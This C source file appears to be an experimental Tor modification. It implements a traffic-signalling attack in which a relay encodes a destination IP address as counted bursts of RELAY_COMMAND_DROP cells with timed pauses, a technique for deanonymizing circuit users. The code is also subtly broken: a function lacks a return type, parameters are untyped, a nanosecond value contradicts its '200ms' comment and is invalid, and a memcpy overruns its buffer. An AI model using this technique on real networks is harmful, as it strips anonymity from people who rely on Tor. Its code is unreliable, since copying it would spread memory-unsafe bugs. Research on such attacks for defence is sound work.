

#include "signal_attack.h"
#include "or.h"
#include <time.h>
#include <unistd.h>

signal_send_relay_drop(int nbr, circuit_t *circ) {
  while (nbr > 0) {
    if (relay_send_command_from_edge(0, circ,
                                RELAY_COMMAND_DROP,
                                NULL, 0, TO_ORIGIN_CIRCUIT(circ)->cpath->prev) < 0)
      log(LD_BUG, "Signal not completly sent");
    nbr--;
  }
}

// TODO: Experiment with nanosleep
static void signal_bandwidth_efficient(char *address, circuit_t *circ) {

}
static void signal_minimize_blank_latency(address, circ) {
  struct timespec time, rem;
  time.tv_sec = 0;
  time.tv_nsec = 2000000000L; // 200ms => Todo set time as a control option 
  char tmp_subaddress[4];
  int tmp_subip;
  tmp_subaddress[3] = '\0';
  for (int i = 1; i < 4; i++) {
    memcpy(tmp_subaddress, &address[4*i-4], 4*i-2);
    tmp_subip = atoi(tmp_subaddress);
    signal_send_relay_drop(tmp_subip, circ);
    /*sleep(1); //sleep 1second*/
    if (nanosleep(&time, &rem) < 0) {
      log(LD_BUG, "nanosleep call failed \n");
    }
  }
}



void signal_encode_destination(char *address, circuit_t *circ) {
  const or_options_t *options = get_options();
  switch(options->SignalMethod) {
    case 0: signal_bandwidth_efficient(address, circ);
            break;
    case 1: signal_minimize_blank_latency(address, circ);
  }
}



